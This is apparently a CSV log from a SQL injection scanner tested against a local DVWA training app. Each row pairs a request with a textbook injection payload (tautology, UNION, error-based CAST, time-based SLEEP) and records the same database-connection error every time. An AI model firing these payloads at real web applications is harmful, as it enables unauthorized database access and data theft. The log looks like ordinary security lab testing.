run_id,url,method,param,payload,status,resp_len,resp_time,sql_error_flag,resp_snippet
b29e78a2-4632-4133-850f-58cfb6f6aa84,http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' OR '1'='1,200,634,2.5202107429504395,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
2a6ba7dc-3c5e-49c6-b2d5-4c5ecbdadc9a,http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' OR '1'='1' --,200,634,2.060983896255493,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
a41326a7-f0b6-49ba-82ee-680a36d4290b,http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' UNION SELECT NULL --,200,634,2.064152479171753,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
3c612a39-36c1-4067-9be8-2cde62a13b41,http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --,200,634,2.0805819034576416,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
f83d39a4-73a8-4f5b-8f6a-4351e366c7bf,http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' AND SLEEP(3) --,200,634,2.0481860637664795,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
b4bf373b-ffc1-4f3b-b4c3-8139194f3702,http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,""" OR ""a""=""a",200,634,2.080976963043213,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
5ea32ee8-cf60-4092-8ab6-60f98715a8e6,http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' OR '1'='1,200,634,2.042381525039673,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
b9c5a7a5-4685-4dd5-8d3a-f2e74546a5df,http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' OR '1'='1' --,200,634,2.092062473297119,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
90a6b2f4-67ea-42e0-a2e1-04a468eb3c35,http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' UNION SELECT NULL --,200,634,2.057163953781128,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
a8da8b3f-6410-43e0-9822-c4e0bb3803b9,http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --,200,634,2.0664258003234863,1,"<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php(570): mysqli_connect('127.0.0.1', 'root', object(sensitiveparametervalue), '', '3306') #1 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\login.php(8): dvwadatabaseconnect() #2"
